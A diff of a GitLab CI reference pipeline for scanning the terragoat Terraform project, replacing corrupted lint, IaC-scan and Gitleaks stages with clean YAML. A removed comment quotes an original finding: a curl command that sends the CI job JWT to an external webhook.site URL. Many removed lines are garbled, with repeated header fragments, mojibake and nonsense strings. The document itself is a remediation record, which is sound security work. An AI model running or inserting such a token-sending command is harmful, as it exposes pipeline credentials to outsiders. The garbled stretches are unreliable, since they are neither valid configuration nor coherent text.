@@ -1,14 +1,14 @@
-# GitLab CI – Secure DevSecOps Pipeline (Reference)
+# GitLab CI - Secure DevSecOps Pipeline (Reference)
 #
 # NOTE: The actual running pipeline for this assessment is GitHub Actions:
-#   rajutest-devops/terragoat → .github/workflows/devsecops-pipeline.yml
+#   rajutest-devops/terragoat -> .github/workflows/devsecops-pipeline.yml
 #
-# This file is the GitLab CI equivalent, required by the assessment document.
-# Same three stages, same tools — GitLab syntax instead of GitHub Actions syntax.
+# This file is the GitLab CI equivalent required by the assessment document.
+# Same three stages, same tools - GitLab CI syntax instead of GitHub Actions.
 #
-# Key fix vs the original gitlabci/bla.yml (FIND-003 / SC-001):
-#   Original: curl "$CI_JOB_JWT_V1" https://webhook.site/...  ← sends OIDC token externally
-#   Fixed:    Token is never sent anywhere. Cloud auth uses OIDC within the runner only.
+# Key fix vs the original gitlabci/bla.yml (SC-001):
+#   Original: Sends the CI job token externally via curl to webhook.site
+#   Fixed:    Token never leaves the runner. OIDC used internally only.
 
 stages:
   - lint
@@ -19,9 +19,26 @@ variables:
   TF_VERSION: "1.5.7"
   CHECKOV_VERSION: "3.2.0"
 
-# ── Stage 1: Lint ─────────────────────────────────────────────�# ── Stage 1: Lint ─────────────────────────────────────� s# ── Stage 1: Lint ─────────ON}   # ── Stage 1: Lint ────────────────�si# ── Stage 1: Lint ────────────────�locke# ── Stage 1: Lint ─────────────────SION# ── Stage 1: Lint ───────────────────rm val# ── Stage 1: Lint ─────────────d=# ── Stage 1: Lint ─────────────────────�lse &&# ── Stage 1: Lint ───────────────────e
+# Stage 1: Lint
+# Validates HCL syntax before any scanning. Fails fast on invalid code.
 
-# ── Stage # ─�Sc# ─�──�# ── ��──# ─�─�# ── Stage # ─��──────────────────────────────────────
+terraform-fmt:
+  stage: lint
+  image: hashicorp/terraform:${TF_VERSION}
+  script:
+    - terraform fmt -check -recursive terraform/
+  allow_failure: true
+
+terraform-validate:
+  stage: lint
+  image: hashicorp/terraform:${TF_VERSION}
+  script:
+    - cd terraform/aws   && terraform init -backend=false && terraform validate
+    - cd ../../terraform/azure && terraform init -backend=false && terraform validate
+    - cd ../../terraform/gcp   && terraform init -backend=false && terraform validate
+  allow_failure: false
+
+# Stage 2: IaC Scan
 # Checkov and TFSec run in parallel. Results go to GitLab Security Dashboard.
 
 checkov-scan:
@@ -37,7 +54,7 @@ checkov-scan:
       sast: [checkov-aws.json, checkov-azure.json, checkov-gcp.json]
     paths: [checkov-*.json]
     expire_in: 30 days
-  allow_failure: true   # findings visible in Security Dashboard but don't block merge
+  allow_failure: true
 
 tfsec-scan:
   stage: iac-scan
@@ -52,17 +69,25 @@ tfsec-scan:
     expire_in: 30 days
   allow_failure: true
 
-# ── Stage 3: Secret # ── Stage 3: Secret # ── Stage��──#��──�# ── Stage 3: Secret # ── Stage 3: Secret # ── Stage��──#��──�# ��# ── Stage 3: Secret # ── Stage 3: Secret # ── Stage��──#��──�# �de# ── Stage 3: Secret # ── Stage 3: Secret # ── Stage��──#��──se).
+# Stage 3: Secret Scan
+# Scans current files and full git history for hardcoded credentials.
+# allow_failure: false - secrets must block the pipeline.
 
-gggggggggggggggggggggggggggggggggggggggmagggggggggghezagggggggggs:v8gggggggggggggggggggggggggggggggggggggggmagggggggggghezaggggggt --sourgggggggggggggggggggggjson --ggggggggggggggggeaks-cugggggggggggggggggggggggggggggggggggggggmagggggggggghezagggggggggs:v8gggggggggggggggggtheggggggged
-    - gitleaks detec    - gitleaks detec    - -all" --report-    - gitleaks detec    - gitleaks detec    - -all" --report-    - "$    - gitleaks detec    - gitleaks detec    - -all" --report-    - json"; exit 1; fi
+gitleaks-scan:
+  stage: secret-scan
+  image: zricethezav/gitleaks:v8.18.2
+  script:
+    - gitleaks detect --source . --report-format json --report-path gitleaks-current.json || LEAK=$?
+    - gitleaks detect --source . --log-opts="--all" --report-format json --report-path gitleaks-history.json || true
+    - if [ "${LEAK}" != "" ]; then echo "SECRETS FOUND - review gitleaks-current.json"; exit 1; fi
   artifacts:
-    paths: [gitleaks-current.json, gitle    paths: [gitleaks-current.json,  days
-    when: al    when: al    whre: fals    when: al    when:ck    when: al    ot just warn
+    paths: [gitleaks-current.json, gitleaks-history.json]
+    expire_in: 30 days
+    when: always
+  allow_failure: false
 
-# ── What this pipeline does NOT do (intentional) ───────────────────────────────
-# No terraform plan or apply — pipeline scans only.
-# No cloud credentials stored — zero credential exposure risk.
-# If deployment is needed, use OIDC (id_tokens) not hardcoded keys:
-#
-#############################################################################################################################################################################################################################################################################################r sent to an external endpoint
+# No deploy stage (intentional)
+# This pipeline scans only. No Terraform apply, no cloud credentials stored.
+# If a deploy stage is added, use OIDC id_tokens - not hardcoded keys.
+# The CI job token must only be used within the runner for credential exchange,
+# never sent to an external endpoint (which is what the original bla.yml did).
